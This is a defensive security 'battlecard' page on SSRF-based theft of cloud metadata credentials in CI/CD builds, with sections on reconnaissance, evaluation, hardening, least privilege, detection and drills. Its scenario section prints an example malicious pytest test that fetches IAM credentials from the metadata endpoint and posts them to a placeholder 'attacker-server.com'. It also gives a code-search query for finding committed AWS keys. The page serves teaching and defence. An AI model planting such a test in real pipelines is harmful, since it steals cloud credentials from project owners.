---
 permalink: /battlecards/cloud-metadata-and-ssrf-in-builds
battlecard:
 title: Cloud Metadata and SSRF in Builds
 category: CI/CD
 scenario: Cloud Metadata & SSRF in Builds
 focus: 
   - IMDS credential theft 
   - SSRF via tests 
   - cloud secret exfiltration 
---
{% block type='battlecard' text='Scenario' %}
An attacker identifies a popular open-source project on GitHub that uses a CI/CD pipeline to automatically test pull requests (PRs). They notice the pipeline runs on cloud-hosted runners (e.g., AWS EC2, GCP Compute Engine). The attacker's goal is to steal the cloud credentials assigned to the build runner to access sensitive data.

The attacker forks the repository and adds a new unit test to a test file. The test seems harmless—it purports to check the functionality of a URL parsing library. However, it's crafted to trigger a Server-Side Request Forgery (SSRF) vulnerability.

**The Malicious Code (example in a Python test file):**
```python
import requests

# A seemingly innocent test added by the attacker
def test_url_fetcher_with_special_characters():
# The payload is a URL to the cloud metadata service
malicious_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# The application code being "tested" unsafely fetches this URL
response = an_existing_url_fetching_function(malicious_url)

# The test exfiltrates the credentials by sending them to the attacker's server
requests.post("https://attacker-server.com/log", data=response.text)

# The test might even pass to avoid suspicion
assert response.status_code == 200
```
The attacker submits a PR with this new test. When the project's CI/CD pipeline automatically runs the tests for the PR, the malicious code executes inside the trusted environment. It queries the cloud's Instance Metadata Service (IMDS), retrieves the temporary IAM credentials assigned to the build runner, and sends them to the attacker's server. With these credentials, the attacker can now assume the role of the CI machine and access any cloud resources it was permitted to, such as S3 buckets with user data, private container registries, or a cloud secret store.

{% endblock %}
{% block type='battlecard' text='Reconnaissance' %}
### Explanation
This is the "casing the joint" phase. The attacker isn't attacking you directly yet; they're gathering intelligence to find the weakest link. For this scenario, they focus on your CI/CD setup, which is often publicly visible. They'll look for repositories that automatically run tests on PRs from external contributors. They study your CI configuration files (`.github/workflows/main.yml`, `.gitlab-ci.yml`) to understand your build environment, what cloud provider you use, the permissions you might be granting, and the dependencies you use.

### Insight
Attackers view a Pull Request as a way to execute their code inside your secure environment. Your CI/CD system is a high-value target because it's automated, trusted, and often has privileged access to other systems. They know that developers are busy and a "helpful" PR with a new test might get merged with minimal scrutiny.

### Practical
As a developer, you can think like an attacker. Go to your public repositories and look at your own CI configuration files.
-   Does your pipeline run automatically on PRs from forks?
-   What permissions are granted in the CI configuration? Does it use a role with broad access like `contributor` or `administrator`?
-   What base images or runners are you using? Are they hardened?

### Tools/Techniques
*   **GitHub Code Search**: Attackers use advanced search queries to find vulnerable CI configurations. Example: `org:my-company language:yaml "aws-access-key-id"`.
*   **Gitleaks**: An open-source tool to [scan git repositories for secrets](https://github.com/gitleaks/gitleaks) that may have been committed by mistake, giving attackers clues or direct access.
*   **Public CI Logs**: Attackers may review the logs of past public builds to understand your environment, dependencies, and internal hostnames.

### Metrics/Signal
*   The number of public projects that automatically trigger builds on external PRs.
*   The level of permission configured for the `GITHUB_TOKEN` or cloud role in your public CI workflow files. A signal of risk is seeing `permissions: write-all`.

{% endblock %}
{% block type='battlecard' text='Evaluation' %}
### Explanation
This is where you, the developer, assess how vulnerable your own systems are to the scenario. It involves looking inward at your code, infrastructure, and processes. You need to determine if an attacker could successfully use an SSRF vulnerability within your test suite to reach the metadata service and if the credentials they'd get would be valuable.

### Insight
Your biggest risks are often at the intersection of components: the test runner (like `pytest` or `jest`), the code it's testing (which might make network calls), and the underlying environment (the CI runner). A vulnerability in any one of these can be exploited. Developers often write tests that make real network calls for convenience, creating an opening.

### Practical
1.  **Review Dependencies**: Check your dependency tree for libraries known to have SSRF vulnerabilities, especially HTTP clients or parsers.
2.  **Test Network Access**: Add a temporary test to a branch that tries to connect to the IMDS endpoint. Does it succeed?
```bash
# In a CI build step, run this:
curl -I -m 2 http://169.254.169.254
```
If you get a successful `200 OK` response, your runner can reach the metadata service.
3.  **Audit IAM Permissions**: Review the IAM role attached to your CI runners. Use AWS's "Access Advisor" to see what permissions the role *actually* uses. You'll likely find it's over-privileged.

### Tools/Techniques
*   **Dependency Scanners**: Tools like [Snyk](https://snyk.io/), [GitHub Dependabot](https://github.com/dependabot), or [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) can identify vulnerable libraries in your `package.json`, `pom.xml`, etc.
*   **IAM Access Analyzer**: An [AWS tool](https://aws.amazon.com/iam/features/access-analyzer/) that helps you identify and remove unused permissions from IAM roles, enforcing least privilege.
*   **SSRF Testing Tools**: Within a controlled environment, you can use tools like [OWASP ZAP](https://www.zaproxy.org/) or [Burp Suite's Collaborator](https://portswigger.net/burp/documentation/collaborator) to test if your application is vulnerable to SSRF.

### Metrics/Signal
*   A list of dependencies with known critical or high-severity vulnerabilities.
*   The percentage of unused permissions on the CI/CD IAM role according to Access Advisor. A high percentage is a bad signal.
*   A boolean `true/false` result from the `curl` test to the IMDS endpoint in your pipeline.

{% endblock %}
{% block type='battlecard' text='Fortify' %}
### Explanation
This stage is about proactive hardening to prevent the attack from succeeding in the first place. You need to build defenses that assume a malicious actor will try to abuse your CI pipeline. The goal is to make it impossible for code running in the build to reach the metadata service or to ensure the credentials it could get are useless.

### Insight
The single most effective shift you can make is from long-lived, static secrets (like `AWS_ACCESS_KEY_ID` stored in GitHub Secrets) to short-lived, dynamic credentials obtained via a secure handshake. This process, often using OpenID Connect (OIDC), dramatically reduces the risk of credential theft.

### Practical
1.  **Enforce IMDSv2**: The latest version of the metadata service (IMDSv2) requires a session-oriented request, which is much harder to exploit with a simple SSRF. You can enforce this at the EC2 instance or organization level.
2.  **Block Metadata Access**: Configure the network firewall for your CI runners (e.g., AWS Security Groups) to explicitly deny all egress traffic to `169.254.169.254`. If your build doesn't need cloud metadata access, block it completely.
3.  **Switch to OIDC**: Stop using static IAM user keys in your CI/CD secrets. Instead, configure your cloud provider to trust your CI/CD provider (e.g., GitHub Actions, GitLab). The CI job can then request temporary, narrowly-scoped credentials for that specific job run without ever handling a long-lived secret.

### Tools/Techniques
*   **Infrastructure as Code (IaC)**: Use tools like [Terraform](https://www.terraform.io/) or [AWS CloudFormation](https://aws.amazon.com/cloudformation/) to programmatically enforce IMDSv2 and firewall rules on your build runners.
```hcl
# Terraform example for enforcing IMDSv2 on an EC2 launch template
resource "aws_launch_template" "ci_runner" {
// ...
metadata_options {
http_endpoint               = "enabled"
http_tokens                 = "required" # This enforces IMDSv2
http_put_response_hop_limit = 1
}
}
```
*   **OIDC Configuration Guides**: All major providers have detailed documentation.
*   [GitHub Actions OIDC with AWS](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services)
*   [GitLab CI/CD OIDC with AWS](https://docs.gitlab.com/ee/ci/cloud_services/aws/)

### Metrics/Signal
*   Percentage of CI runners in your fleet that are configured to require IMDSv2.
*   Percentage of CI/CD pipelines that have been migrated to use OIDC instead of static secrets. Your goal should be 100%.
*   Automated tests that confirm network rules are blocking access to the IMDS endpoint.

{% endblock %}
{% block type='battlecard' text='Limit' %}
### Explanation
Assume the attacker bypasses your defenses and successfully steals credentials. This stage is about minimizing the potential damage. The principle is "least privilege": the stolen credentials should only grant the absolute minimum permissions required for the build job to function. This contains the "blast radius" of the breach.

### Insight
A common mistake is to create a single, powerful `ci-runner-role` and use it for all projects. This means a compromise in your least important project can give an attacker access to your most critical production resources. The permissions for building a documentation website should be vastly different from those for deploying a production application.

### Practical
1.  **Job-Specific Roles**: Create a unique IAM role for each distinct CI/CD job or workflow. A job that builds a Docker container needs `ecr:*` permissions, but it does not need `s3:ListBuckets` or `iam:PassRole`.
2.  **Isolate Environments**: Use separate cloud accounts or projects for different environments (e.g., dev, staging, prod, and a dedicated `build` account). A compromise in the `build` account should have zero network or IAM paths into the `prod` account.
3.  **Condition Keys**: In your IAM policies, use condition keys to restrict where the credentials can be used from. For example, you can limit actions to a specific source IP range, or in the context of OIDC, to a specific GitHub repository.
```json
"Condition": {
"StringEquals": {
"token.actions.githubusercontent.com:repository": "my-org/my-app-repo"
}
}
```

### Tools/Techniques
*   **AWS Organizations**: Use [AWS Organizations](https://aws.amazon.com/organizations/) to create a multi-account structure that isolates build, development, and production workloads.
*   **IAM Policy Simulator**: Use the [AWS IAM Policy Simulator](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_testing-policies.html) to test your least-privilege policies before deploying them.
*   **Open Policy Agent (OPA)**: For advanced policy-as-code, [OPA](https://www.openpolicyagent.org/) can be used to enforce rules like "No CI role may have wildcard (`*`) permissions."

### Metrics/Signal
*   The average number of permissions per CI IAM role. A lower number is better.
*   A successful security audit confirming that build environments are logically and electronically isolated from production environments.
*   Automated pipeline checks that fail if a CI role has permissions deemed too broad.

{% endblock %}
{% block type='battlecard' text='Expose' %}
### Explanation
This is about detection and response. You need visibility into your systems to know when an attack is happening. How would you know if a build runner's credentials were stolen and are being used by an attacker from their laptop? You need to monitor for anomalies and suspicious activity.

### Insight
Attackers have to use the credentials they steal. This is your best chance to catch them. Their activity will look different from your normal, automated CI process. A CI role that normally only pushes to a container registry but suddenly starts listing S3 buckets or describing EC2 instances is a major red flag.

### Practical
1.  **Log Everything**: Enable detailed logging for all API activity in your cloud environment. For AWS, this is CloudTrail. Ensure you are logging not just management events (`ListBuckets`) but also data events (`GetObject`).
2.  **Set Up Anomaly Detection**: Configure alerts based on unusual behavior. For example:
*   A CI/CD role being used from an IP address that is not one of your known corporate or CI runner IP ranges.
*   A role attempting to perform an action it has never performed before (e.g., `secretsmanager:GetSecretValue`).
*   A high rate of `Access Denied` errors, which could indicate an attacker probing the limits of the stolen credentials.

### Tools/Techniques
*   **AWS CloudTrail**: The canonical source for all API activity in AWS. All logs should be sent to a central, secure S3 bucket.
*   **Amazon GuardDuty**: A managed threat detection service that uses machine learning to identify anomalous activity, including a specific finding for "[InstanceCredentialsExfiltration](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialsexfiltration)".
*   **SIEM Tools**: Send your logs to a Security Information and Event Management (SIEM) tool like [Splunk](https://www.splunk.com/), [Datadog](https://www.datadoghq.com/), or [Sumo Logic](https://www.sumologic.com/) to create custom dashboards and alerts.
*   **Falco**: An open-source [runtime security tool](https://falco.org/) that can detect suspicious behavior inside your build containers, such as unexpected network connections or file access.

### Metrics/Signal
*   An alert is successfully generated and sent to the security team when CI credentials are used from a suspicious IP address.
*   The mean time to detect (MTTD) a simulated credential misuse event, from the event occurring to an alert being raised.
*   The number of high-fidelity alerts vs. noisy, low-value alerts.

{% endblock %}
{% block type='battlecard' text='eXercise' %}
### Explanation
This stage is about building muscle memory through practice. You can't wait for a real attack to test your defenses. You need to simulate attacks in a controlled way to see how your people, processes, and tools hold up. This helps developers understand the threat and improves your defenses based on real-world testing.

### Insight
Security is not just a document or a tool; it's a practice. Running regular, small-scale security drills makes everyone more prepared. When developers see a simulated attack get blocked by a control they implemented (like an egress firewall rule), it reinforces the value of that control and encourages a security-first mindset.

### Practical
1.  **Run a Tabletop Exercise**: Gather the development team and walk through the attack scenario verbally. Ask questions like: "What would we do if we got an alert from GuardDuty? Who is responsible for rotating the credentials? How would we verify the extent of the breach?"
2.  **Perform a Controlled Red Team Test**: Create a private fork of a repository. Intentionally add a vulnerable test case that tries to exfiltrate credentials, just like in the scenario. Run it against a non-production staging environment.
*   Did your `Fortify` controls block it? (e.g., did the network rule prevent access to IMDS?)
*   Did your `Expose` systems detect it and fire an alert?
*   Were the credentials it managed to get (if any) useless because of your `Limit` controls?
3.  **Capture and Act on Findings**: After the exercise, hold a retrospective. What worked? What didn't? Create tickets in your backlog to fix the gaps you found.

### Tools/Techniques
*   **Custom Scripts**: A simple Python or shell script that simulates the SSRF and exfiltration can be used for the red team test.
*   **Stratus Red Team**: An open-source tool for [emulating cloud threat tactics](https://github.com/DataDog/stratus-red-team) in a safe, automated way. It has specific modules for things like stealing EC2 instance credentials.
*   **Attack-Range by Splunk**: A framework for [building and testing security detections](https://github.com/splunk/attack_range) against a simulated environment.

### Metrics/Signal
*   The time-to-detect and time-to-remediate for the simulated attack.
*   The number of action items generated from the exercise that are successfully resolved in the next sprint.
*   Positive feedback from developers indicating they have a better understanding of the risks and their role in preventing them.
{% endblock %}